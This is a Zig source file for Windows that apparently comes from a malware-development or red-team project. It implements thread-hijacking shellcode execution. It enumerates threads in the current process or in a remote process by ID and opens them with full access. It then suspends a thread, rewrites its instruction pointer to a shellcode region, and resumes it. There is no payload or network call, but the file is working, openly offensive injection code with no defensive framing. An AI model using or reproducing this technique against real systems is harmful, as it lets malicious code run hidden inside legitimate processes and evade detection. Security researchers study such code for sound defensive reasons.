const std = @import("std");
const win = @import("zigwin32").everything;

// x86
// const CONTEXT_CONTROL = 0x00010001;

// x64
const CONTEXT_CONTROL = 0x00100001;

const HANDLE = win.HANDLE;
const CONTEXT = win.CONTEXT;
const INFINITE = win.INFINITE;
const THREAD_ALL_ACCESS = win.THREAD_ALL_ACCESS;
const THREADENTRY32 = win.THREADENTRY32;

const CreateToolhelp32Snapshot = win.CreateToolhelp32Snapshot;
const GetCurrentThreadId = win.GetCurrentThreadId;
const GetCurrentProcessId = win.GetCurrentProcessId;
const Thread32First = win.Thread32First;
const Thread32Next = win.Thread32Next;
const OpenThread = win.OpenThread;
const GetThreadContext = win.GetThreadContext;
const SetThreadContext = win.SetThreadContext;
const SuspendThread = win.SuspendThread;
const ResumeThread = win.ResumeThread;
const WaitForSingleObject = win.WaitForSingleObject;
const GetLastError = win.GetLastError;
const CloseHandle = win.CloseHandle;

pub fn hijackThread(h_thread: HANDLE, shell_code_region: *anyopaque, suspend_thread: bool) !void {
    if (suspend_thread) _ = SuspendThread(h_thread);

    var thread_context: CONTEXT = undefined;
    thread_context.ContextFlags = CONTEXT_CONTROL;
    if (GetThreadContext(h_thread, &thread_context) == 0) {
        std.debug.print("[!] GetThreadContext Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.GetThreadContextFailed;
    }

    // X86
    // thread_context.Eip = @intFromPtr(shell_code_region);

    // X64
    thread_context.Rip = @intFromPtr(shell_code_region);

    if (SetThreadContext(h_thread, &thread_context) == 0) {
        std.debug.print("[!] SetThreadContext Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.SetThreadContextFailed;
    }

    _ = ResumeThread(h_thread);
    _ = WaitForSingleObject(h_thread, INFINITE);
}

pub fn getFirstNonMainThreadHandleInCurrentProcess() !HANDLE {
    const current_process_id = GetCurrentProcessId();
    const main_thread_id = GetCurrentThreadId();

    const h_snapshot = CreateToolhelp32Snapshot(.{ .SNAPTHREAD = 1 }, 0) orelse {
        std.debug.print("[!] CreateToolhelp32Snapshot Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateToolhelp32SnapshotFailed;
    };
    defer _ = CloseHandle(h_snapshot);

    var thread_entry: THREADENTRY32 = undefined;
    thread_entry.dwSize = @sizeOf(THREADENTRY32);

    if (Thread32First(h_snapshot, &thread_entry) == 0) {
        std.debug.print("[!] Thread32First Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.Thread32FirstFailed;
    }

    while (Thread32Next(h_snapshot, &thread_entry) != 0) {
        if (thread_entry.th32OwnerProcessID == current_process_id and thread_entry.th32ThreadID != main_thread_id) {
            const h_thread = OpenThread(THREAD_ALL_ACCESS, 0, thread_entry.th32ThreadID) orelse {
                std.debug.print("[!] OpenThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
                return error.OpenThreadFailed;
            };

            return h_thread;
        }
    }

    return error.FailedToGetLocalThreadHandle;
}

pub fn getFirstThreadHandleFromRemoteProcess(process_id: u32) !HANDLE {
    const h_snapshot = CreateToolhelp32Snapshot(.{ .SNAPTHREAD = 1 }, 0) orelse {
        std.debug.print("[!] CreateToolhelp32Snapshot Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateToolhelp32SnapshotFailed;
    };
    defer _ = CloseHandle(h_snapshot);

    var thread_entry: THREADENTRY32 = undefined;
    thread_entry.dwSize = @sizeOf(THREADENTRY32);

    if (Thread32First(h_snapshot, &thread_entry) == 0) {
        std.debug.print("[!] Thread32First Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.Thread32FirstFailed;
    }

    while (Thread32Next(h_snapshot, &thread_entry) != 0) {
        if (thread_entry.th32OwnerProcessID == process_id) {
            const h_thread = OpenThread(THREAD_ALL_ACCESS, 0, thread_entry.th32ThreadID) orelse {
                std.debug.print("[!] OpenThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
                return error.OpenThreadFailed;
            };

            return h_thread;
        }
    }

    return error.FailedToGetRemoteThreadHandle;
}
